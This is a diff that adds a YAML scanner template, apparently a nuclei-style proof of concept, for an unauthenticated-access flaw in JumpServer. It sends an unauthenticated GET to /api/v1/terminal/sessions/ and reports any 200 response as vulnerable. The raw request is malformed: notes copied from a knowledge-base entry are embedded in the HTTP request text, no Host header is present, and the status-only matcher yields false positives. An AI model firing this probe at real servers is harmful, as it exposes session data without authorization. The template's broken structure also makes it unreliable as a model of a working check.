@@ -1,0 +1,40 @@
+id: poc-iq7x0fh8fp4apq1r
+info:
+  name: JumpServer未授权访问漏洞
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/iq7x0fh8fp4apq1r'
+  tags: unauth,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: iq7x0fh8fp4apq1r
+    fofa: 暂无
+http:
+- raw:
+  - 'GET /api/v1/terminal/sessions/ HTTP/1.1
+
+
+    Accept: */*
+
+
+    Connection: Keep-Alive
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    id
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
